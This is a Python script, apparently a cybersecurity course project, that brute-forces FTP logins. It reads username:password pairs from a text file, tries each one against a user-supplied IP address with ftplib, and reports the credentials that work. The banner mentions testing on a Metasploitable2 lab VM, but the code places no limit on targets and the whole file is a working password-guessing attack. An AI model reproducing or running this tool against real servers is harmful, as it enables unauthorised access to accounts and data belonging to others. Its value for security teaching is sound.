#FTP
#---
#FTPlib Brute Force FTP Credentials

import ftplib
import FP
import os
import sys
import time
import ipaddress
import re

def restart():
	time.sleep(2)
	print('---')
	y = 'y'
	n = 'n'
	while True:
		try:
			res = input('\n[!] Do you want to Restart or Quit the Program? [y - Restart, n - Quit]: ')
			if res == n:
				print(' ')
				print('[!] Shutting Down Program...')
				time.sleep(1)
				print('[!] Returning Home...')
				print('-----')
				print(' ')
				time.sleep(1)
				FP.cTool()
				quit()
			elif res == y:
				print(' ')
				print('[!] Restarting Program...')
				print('-----')
				print(' ')
				time.sleep(1)
				main()
			else:
				break
			
		except ValueError:
			print(' ')
			print('[!] Please Enter Valid Input!')
			restart()
		else:
			break

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		try:
			userName = line.split(':')[0]
			passWord = line.split(':')[1].strip('\r').strip('\n')
			print('----------------')
			print("\n[+] Atempting Login...")
			print("\nUsername: " + userName + "\nPassword: " + passWord)
			try:
				ftp = ftplib.FTP(hostname)
				ftp.login(userName, passWord)
				print('\n[*] ' + str(hostname))
				while True:
					try:
						time.sleep(1)
						print('FTP Login Succeeded!!')
						print('\nUsername: ' + userName + "\nPassword: " + passWord)
						time.sleep(1)
						break
					except:
						pass
			except(Exception):
				print('\nUsername or Password (or both) are Invalid!')
				pass
		
		except(IndexError):
			pass
		except(ValueError):
			pass

	time.sleep(1)
	print('\n[+] FTP Brute Force Complete!')
	print(' ')
	time.sleep(1)
	print(' ')
	restart()

def main():
	print('*------------------------------------------*')
	print('*                                          *')
	print('*           JTs FTP Brute Force            *')
	print('*                 CYB 339                  *')
	print('*                                          *')
	print('*------------------------------------------*')
	print(' ')
	print('The target used in testing was a Metasploitable2 Linux VM')
	print(' ')
	print('***PLEASE NOTE THAT: If the Username & Password are correct, the ')
	print('script will prompt a restart. IN TESTING MULTIPLE USERNAMES & PASSWORDS ')
	print('WERE MARKED AS VALID CREDENTIALS!!! You may have to edit the .txt file ')
	print('to view all valid credentials!!***')
	print(' ')
	print('PLEASE DO NOT LEAVE BLANK LINES IN .txt FILE IT CAUSES AN ERROR!')
	print(' ')
	time.sleep(1.5)
	while True:
		print(' ')
		print('Choose Target IP Address - Please Enter Valid Target IP: ')
		host = input('Enter Target IP Address - ex. <0.0.0.0>: ')
		try:
			ip_address_obj = ipaddress.ip_address(host)
			print(' ')
			print("You Have Entered a Valid IP Address!! :)")
			print('-----')
			time.sleep(1)
			break
		except:
			print(' ')
			print("You Have Entered an Invalid IP Address!! :(")
			print('-----')
		else:
			restart()
			break
	
	while True:
		print(' ')
		print('Choose .txt File to that holds Username and Passwords to Try: ')
		print('.txt MUST BE INCLUDED IN INPUT & MUST BE IN THE FOLDER #1!')
		passwdFile = input('Please Enter Credentials txt File - ex. <File_Name.txt>: ')
		try:
			pwdFile = os.path.exists(passwdFile)
			if pwdFile == True:
				print('\n[+] File is Valid!')
				break
			else:
				print('\n[!] File is Invalid')
		except(Exception):
			print('\n[!] File is Invalid')
	
	bruteLogin(host, passwdFile)

if __name__ == '__main__':
	main()



